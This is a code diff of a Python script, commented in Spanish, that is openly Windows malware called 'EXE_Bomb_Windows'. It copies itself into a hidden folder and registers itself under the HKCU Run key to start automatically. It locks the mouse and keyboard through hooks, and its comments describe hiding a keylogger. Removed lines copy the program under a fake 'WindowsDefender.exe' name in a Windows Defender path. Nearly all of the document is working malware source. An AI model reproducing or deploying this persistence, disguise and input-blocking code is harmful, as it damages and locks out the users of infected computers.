@@ -9,12 +9,12 @@ import threading
 import shutil
       
 def addStartup():  # function =  Iniciar automaticamente
-    path = r"C:\Users\Public\Security\Windows Defender\EXE_Bomb_Windows.exe"        # Path del Software completo
+    path = r"C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\EXE_Bomb_Windows.exe"        # Path del Software completo
     name = "EXE_Bomb_Windows"                                                       # Nombre del StartUp
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
     def verificar():    # Evita que se créen 2 veces el Bom
         try:  # Intenta crear la dirección
-            os.makedirs('C:\\Users\\Public\\EXEBombWindows\\Boom')
+            os.makedirs('C:\\Users\\Public\\EXEBombWindows\\BoomRUN')
             return True # Se creó la carpeta
         except:
             return False# La carpeta ya existe
@@ -27,7 +27,7 @@ def addStartup():  # function =  Iniciar automaticamente
             registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
             SetValueEx(registry,name, 0, REG_SZ, path)
                       
-def Block():    # Lib [KeyandMouse_Block]
+def Block():            # Lib [KeyandMouse_Block]
     mouse = Controller()  
     def BlockMouse():
         mouse.position = (0, 0) # el mouse se va a la posición 0,0 de la pantalla
@@ -44,56 +44,14 @@ def Block():    # Lib [KeyandMouse_Block]
         k.KeyAll = e
         k.HookKeyboard()
         pythoncom.PumpMessages()    # Bloquea Teclado
-def CreateFileMain():
+def CreateFileMain():   #
         try:  # Intenta crear la dirección 
             os.makedirs('C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres')
             return True
         except:
             return False
         pass
-def ReplicateFile():  #Crea block de notas en el escritorio
-    def CreataDirectories():
-        try:  # Intenta crear la dirección 
-            os.makedirs('C:\\Users\\'+str(getuser())+'\\Desktop')
-        except:
-            pass
-        try:  # Intenta crear la dirección 
-            os.makedirs('C:\\Users\\'+str(getuser())+'\\Documents')
-        except:
-            pass
-        try:  # Intenta crear la dirección 
-            os.makedirs('C:\\Users\\'+str(getuser())+'\\Music')
-        except:
-            pass
-        try:  # Intenta crear la dirección 
-            os.makedirs('C:\\Users\\'+str(getuser())+'\\Videos')
-        except:
-            pass
-        try:  # Intenta crear la dirección 
-            os.makedirs('C:\\Users\\'+str(getuser())+'\\Pictures')
-        except:
-            pass
-        try:  # Intenta crear la dirección 
-            os.makedirs('C:\\Users\\'+str(getuser())+'\\Downloads')
-        except:
-            pass
-        try:  # Intenta crear la dirección 
-            os.makedirs('C:\\Users\\'+str(getuser())+'\\AppData\\Roaming\\VirusBomb')
-        except:
-            pass
-        try:  # Intenta crear la dirección 
-            os.makedirs('C:\\Users\\'+str(getuser())+'\\AppData\\LocalLow\\VirusBomb')
-        except:
-            pass
-        try:  # Intenta crear la dirección 
-            os.makedirs('C:\\Users\\'+str(getuser())+'\\AppData\\Local\\VirusBomb')
-        except:
-            pass
-    
-    nameKey = "WindowsDefender.exe"
-    filePath = "C:\\Users\\Public\\Security\\Windows Defender\\"+ nameKey
-    
-    shutil.copy(nameKey , filePath)
+
         
         
 def saturar():
@@ -111,29 +69,35 @@ def saturar():
 
 if __name__ == '__main__':
     if (CreateFileMain()):  # Primer inicio
-        
-        #Replica 
-        try:
-            nameKey = "EXE_Bomb_Windows.exe"
-            filePath = 'C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres'+ nameKey
-            shutil.copy(nameKey , filePath)
-            print("Se replico exitosamente")
-        except:
-            print("No se replicó")
-            
+        nameKey = "EXE_Bomb_Windows.exe"
+        filePath = "C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\"+ nameKey 
+        try:     
+            with open(filePath, 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
+                print("El virus existe")
+        except : #Replica 
+            print("No se encuentra en la carpeta, replicando...")
+            try:
+                shutil.copy(nameKey , filePath) # Intenta ocultar el keylogger en una carpeta
+                print("Se replicó exitosamente")
+            except:
+                print("Replica fallida")
         # Autoinicia en registro
         addStartup()
         print("se creó la carpeta y startup exitoso, virus deshabilitado")
         exit()
     else:                   # Segundo inicio
-        #Block()                             # Bloquea Teclado y mouse
-        #addStartup()
-        # Hilos
+        #block= threading.Thread(target=Block)   # Bloquea Teclado y mouse
+        #block.start()
+                   
+        
+        
+        
+        
+        
+        
         #h1= threading.Thread(target=ReplicateFile)   # C
         #h1.start()
         #h1.join()
-        
-        
         """
         p1 = Process(target=a)     #  Inicia automaticamente
         p2 = Process(target=B)          # 
